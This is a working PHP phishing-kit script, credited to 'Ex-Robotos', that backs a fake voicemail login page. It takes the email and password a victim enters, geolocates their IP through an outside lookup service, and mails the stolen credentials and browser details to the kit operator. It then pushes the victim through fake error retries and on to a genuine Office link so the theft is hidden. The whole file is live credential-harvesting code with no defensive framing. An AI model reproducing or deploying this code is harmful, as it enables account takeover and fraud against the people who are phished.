<?php
/* 
Voicemail Scmpage 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/
error_reporting(0);include('blocker.php');include('config.php');$password = $_POST['passwd'];$data = $_GET['data'];

if ( base64_encode(base64_decode($data)) === $data){
    $email = base64_decode($data);
     // Remove all illegal characters from email
$email = filter_var($email, FILTER_SANITIZE_EMAIL);

// Validate e-mail
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die(header("Location: ".$FailRedirect));
}  

} else {
    $email = $data;
         // Remove all illegal characters from email
$email = filter_var($email, FILTER_SANITIZE_EMAIL);

// Validate e-mail
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die(header("Location: ".$FailRedirect));
} 

}
   
        


/* Bad login check */
$remoteIP  = getenv("REMOTE_ADDR");$subject = "$email | $remoteIP Voicemail Logs";
$headers = "From: Voicemail Logs <bot@domain.com>" . "\r\n" . "MIME-Version: 1.0";

$ExRobotos = curl_init();curl_setopt($ExRobotos, CURLOPT_URL, "http://ip-api.com/json/".$remoteIP);curl_setopt($ExRobotos, CURLOPT_HEADER, 0);curl_setopt($ExRobotos, CURLOPT_RETURNTRANSFER, TRUE);$curlExec = curl_exec($ExRobotos);curl_close($ExRobotos);
$IP_LOOKUP = json_decode($curlExec,true);


if($IP_LOOKUP && $IP_LOOKUP['query'] != null) {
    
    
    $Ex_country = $IP_LOOKUP['country'];$Ex_countrycode = $IP_LOOKUP['countryCode'];$Ex_state = $IP_LOOKUP['regionName'];$Ex_city = $IP_LOOKUP['city'];$Ex_postal = $IP_LOOKUP['zip'];$browser = $_SERVER['HTTP_USER_AGENT'];$date = date("D M d, Y g:i a");

/* True Data Check */
$message = "
Voicemail Scmpage 2019 by Ex-Robotos
Information: New Logs
Email : $email - Password : $password
IP Address: $remoteIP Country: $Ex_country Country Code: $Ex_countrycode
Region: $Ex_state City: $Ex_city Postal Code: $Ex_postal
Date: $date Browser: $browser
";mail ($to, $subject, $message, $headers);
    
}else{
 mail ($to, $subject." Failed", "Failed fetching data from api (maybe api is dead or CURL extension is disabled)", $headers);   
}

function RndString($length = 50) {
return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}
$randpart = RndString(50).''.RndString(50).''.RndString(50);
if (isset($_GET['error'])){
    
    if($passloopNumber==2){
echo "<script type=\"text/javascript\">
setTimeout(function(){
            window.location.href = '$officeLink';
         }, 5000)</script>\n";
echo "<a href=\"$officeLink\" rel=\"noreferrer\" id=\"autoclick\"></a>
<script>document.getElementById('autoclick').click();</script>\n";
die();
}

echo "<script type=\"text/javascript\">window.location.href = \"./login.php?$randpart&status=error2&string=signin&data=$data\"</script>\n";
}else if (isset($_GET['error2'])){
    
if($passloopNumber==3){
echo "<script type=\"text/javascript\">
setTimeout(function(){
            window.location.href = '$officeLink';
         }, 5000)</script>\n";
echo "<a href=\"$officeLink\" rel=\"noreferrer\" id=\"autoclick\"></a>
<script>document.getElementById('autoclick').click();</script>\n";
die();
}    
    
echo "<script type=\"text/javascript\">window.location.href = \"./login.php?$randpart&status=error3&string=signin&data=$data\"</script>\n";
}else if (isset($_GET['error3'])){
    
echo "<script type=\"text/javascript\">
setTimeout(function(){
            window.location.href = '$officeLink';
         }, 5000)</script>\n";
echo "<a href=\"$officeLink\" rel=\"noreferrer\" id=\"autoclick\"></a>
<script>document.getElementById('autoclick').click();</script>\n";
die();

}else{
    
if($passloopNumber==1){
echo "<script type=\"text/javascript\">
setTimeout(function(){
            window.location.href = '$officeLink';
         }, 5000)</script>\n";
echo "<a href=\"$officeLink\" rel=\"noreferrer\" id=\"autoclick\"></a>
<script>document.getElementById('autoclick').click();</script>\n";
die();
}

echo "<script type=\"text/javascript\">window.location.href = \"./login.php?$randpart&status=error&string=signin&data=$data\"</script>\n";

}



?>